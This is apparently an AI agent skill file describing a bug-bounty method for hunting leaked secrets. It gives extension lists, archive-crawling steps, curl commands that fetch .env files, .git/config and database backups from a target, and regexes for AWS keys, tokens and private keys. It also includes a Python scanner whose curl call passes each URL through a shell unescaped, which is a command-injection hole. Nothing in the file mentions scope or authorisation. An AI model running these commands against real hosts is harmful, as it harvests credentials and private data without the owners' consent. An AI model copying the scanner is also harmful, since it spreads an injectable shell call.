---
name: secrets-leak-deep-dive
description: Complete Sensitive Data Leakage methodology - BACK-ME-UP engine, 162 extension patterns, secrets discovery, payout data
tools:
  - Bash
  - WebFetch
  - WebSearch
  - Read
triggers:
  - secrets leak
  - sensitive data
  - information disclosure
  - data leak
  - secrets exposure
  - backmeup
  - juicy files
---

# Complete Sensitive Data Leakage Methodology — Integrated from BACK-ME-UP

## What is BACK-ME-UP?
A powerful shell-based tool by Dheeraj Madhukar that automates URL collection from internet archives and filters for sensitive data leakage using 162 extension patterns and regex matching. Integrated into OpenCode BB v2.

## Top 162 Juicy Extensions (from ext.txt)

### Database Files (Critical)
```
sql, db, sqlite, pgsql, mysql, accdb, dbf, mdb, pdb
sql.gz, mysql-connect, mysql-pconnect
```

### Config/Env Files (Critical)
```
env, config, configs, conf, ini, cfg, properties
yml, yaml, xml, json, dtd, plist
```

### Backup Files (High)
```
bak, bkp, old, orig, save, save.1, backup
_bak, _old, bak1, ~, (1), %01, swp
```

### Key/Credential Files (Critical)
```
pem, key, cer, crt, pfx, p12, asc, gpg
ovpn, secret, secrets, passwd, pwd, access
```

### Source Code (High)
```
git, gitignore, py, rb, go, java, cpp, c
sh, bash_history, pl, vb, vbs, asp, aspx
war, jar, class, apk, dll, so, exe
```

### Log/Data Files (Medium)
```
log, txt, csv, pdf, doc, docx, xls, xlsx
ppt, pptx, odt, odf, rtf, dat
```

## Methodology

### Step 1: URL Collection
Run multiple tools in parallel for maximum coverage:
```bash
bash tools/backmeup.sh -d target.tld
```
Tools used: gau, gauplus, waybackurls, katana (passive), gospider, hakrawler

### Step 2: Regex Generation
Each extension gets 6 regex patterns:
```
([^.]+)\.sql$              # file.sql
([^.]+)\.sql\.[0-9]+$      # file.sql.1
([^.]+)\.sql[0-9]+$        # file.sql1
([^.]+)\.sql[a-z][A-Z][0-9]+$  # file.sqlaA1
([^.]+)\.sql\.[a-z][A-Z][0-9]+$ # file.sql.aA1
([^.]+)\.sql\?(.*)=(.*)$   # file.sql?param=value
```

### Step 3: Extension-Based Hunting

#### .git/config Exposure
```bash
# Check if .git is exposed
curl -sk "https://target.tld/.git/config"
# Look for: [remote "origin"], url = https://github.com/...
grep -Rai "\[remote.*origin\]" findings/target/waybackurls.txt
```

#### .env File Exposure
```bash
# Common .env paths
curl -sk "https://target.tld/.env"
curl -sk "https://target.tld/env"
curl -sk "https://admin.target.tld/.env"
# Look for: DB_HOST, DB_PASSWORD, API_KEY, SECRET_KEY, AWS_ACCESS_KEY
```

#### Database Backup Exposure
```bash
# Common backup naming patterns
curl -sk "https://target.tld/backup.sql"
curl -sk "https://target.tld/db/dump.sql"
curl -sk "https://target.tld/sql/database_backup.sql"
curl -sk "https://storage.target.tld/backups/db_2024.sql.gz"
```

#### AWS Key Exposure
```bash
# AWS keys in exposed files
grep -Rai "AKIA[0-9A-Z]{16}" findings/target/
grep -Rai "aws_access_key_id\|aws_secret_access_key" findings/target/
```

### Step 4: Automated Scan
```bash
# Full pipeline
python3 tools/secrets_scanner.py target.tld

# Or step by step
bash tools/backmeup.sh -d target.tld
bash tools/secrets_classifier.sh findings/target/
```

### Step 5: Verify Each Finding
```bash
# Check if URL is accessible
curl -sk -o /dev/null -w "%{http_code}" "https://target.tld/.env"

# Check content for actual secrets
curl -sk "https://target.tld/.env" | grep -E "(PASS|KEY|SECRET|TOKEN)"

# Verify its not a default/template file
curl -sk "https://target.tld/.env" | head -5
```

## Real-World Payouts

| Finding | Typical Payout | Max Payout | Example |
|---------|---------------|------------|---------|
| .git/config → cloud creds | $2,000 - $10,000 | $30,000 | Uber git leak → full infra |
| .env with AWS keys | $1,000 - $5,000 | $17,576 | Dropbox AWS keys via SSRF |
| Database backup exposed | $500 - $3,000 | $5,000 | Shopify DB backup |
| SSH private key | $1,000 - $5,000 | $10,000 | Internal server access |
| Config file with API keys | $500 - $2,000 | $4,000 | Stripe/API key leak |
| Source code disclosure | $500 - $3,000 | $5,000 | Proprietary code leak |
| Log file with PII | $500 - $2,000 | $2,500 | User data in debug logs |

## Automation Script

```python
#!/usr/bin/env python3
"""secrets_scanner.py — Automated sensitive data leakage scanner"""
import subprocess, sys, json, re
from pathlib import Path

SECRET_PATTERNS = {
    "AWS Key": r"AKIA[0-9A-Z]{16}",
    "AWS Secret": r"(?i)aws_secret_access_key\s*[=:]\s*['\"][a-zA-Z0-9/+]{40}['\"]",
    "GitHub Token": r"gh[pousr]_[A-Za-z0-9_]{36,251}",
    "Slack Token": r"xox[baprs]-[0-9]{10,13}-[0-9]{10,13}-[a-zA-Z0-9]{24}",
    "Google API Key": r"AIza[0-9A-Za-z_-]{35}",
    "Google OAuth": r"[0-9]+-[0-9A-Za-z_]{32}\.apps\.googleusercontent\.com",
    "JWT Token": r"eyJ[a-zA-Z0-9_-]{10,}\.eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}",
    "Private Key": r"-----BEGIN (RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----",
    "MySQL Connection": r"mysql://[a-zA-Z0-9]+:[a-zA-Z0-9]+@",
    "MongoDB Connection": r"mongodb://[a-zA-Z0-9]+:[a-zA-Z0-9]+@",
    "PostgreSQL Connection": r"postgresql://[a-zA-Z0-9]+:[a-zA-Z0-9]+@",
    "Redis Connection": r"redis://:[a-zA-Z0-9]+@",
    "Stripe Key": r"sk_live_[0-9a-zA-Z]{24}",
    "Telegram Bot Token": r"[0-9]{8,10}:[a-zA-Z0-9_-]{35}",
}

def scan_urls(urls_file):
    findings = []
    with open(urls_file) as f:
        urls = [l.strip() for l in f if l.strip()]
    
    for url in urls[:100]:
        try:
            result = subprocess.run(
                f"curl -skL --connect-timeout 5 --max-time 10 '{url}'",
                shell=True, capture_output=True, text=True, timeout=15
            )
            content = result.stdout
            
            for name, pattern in SECRET_PATTERNS.items():
                matches = re.findall(pattern, content)
                if matches:
                    findings.append({
                        "type": name,
                        "url": url,
                        "match": matches[0][:80] if isinstance(matches[0], str) else str(matches[0])[:80],
                        "status": result.returncode
                    })
        except:
            pass
    
    return findings

if __name__ == "__main__":
    target = sys.argv[1]
    print(json.dumps(scan_urls(target), indent=2))
```

## Classification Matrix

| Severity | Extension Types | Impact |
|----------|----------------|--------|
| CRITICAL | .git, .env, .pem, .key, .ovpn, secrets | Cloud compromise, server access |
| HIGH | .sql, .db, .config, .yml, backup files | Data breach, credential theft |
| MEDIUM | .log, .json, .csv, .txt, .xml | PII exposure, intel gathering |
| LOW | .html, .js, .css, .png, .jpg | Typically safe but review anyway |

## Payout Range
- **$500 - $30,000** depending on what secrets are exposed
- Chained: secrets → cloud access → full compromise ($5K-$50K+)
